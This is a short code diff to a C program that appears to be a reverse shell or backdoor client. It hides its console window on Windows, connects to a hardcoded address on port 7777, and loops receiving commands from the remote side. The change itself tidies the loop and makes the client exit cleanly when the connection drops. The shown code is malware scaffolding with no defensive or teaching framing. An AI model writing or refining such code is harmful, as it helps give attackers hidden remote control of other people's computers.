@@ -4,7 +4,6 @@ int main() {
 #ifdef _WIN32
     FreeConsole();
 #endif
-
     const char *ipTarget = "192.168.0.114";
     const unsigned int PORT = 7777;
     char buffer_send[8192] = "";
@@ -43,10 +42,14 @@ int main() {
     send(sock, buffer_send, sizeof(buffer_send), 0);
 #endif
 
-    while (true) {
+    while (TRUE) {
         memset(buffer_send, 0, sizeof(buffer_send));
 
-        recv(sock, command_rcv, sizeof(command_rcv), 0);
+        if (recv(sock, command_rcv, sizeof(command_rcv), 0) == 0) {
+            CloseSocket(sock);
+            CloseConnect();
+            return 0;
+        }
 
         if(strcmp(command_rcv, "exit") == 0) {
             CloseSocket(sock);
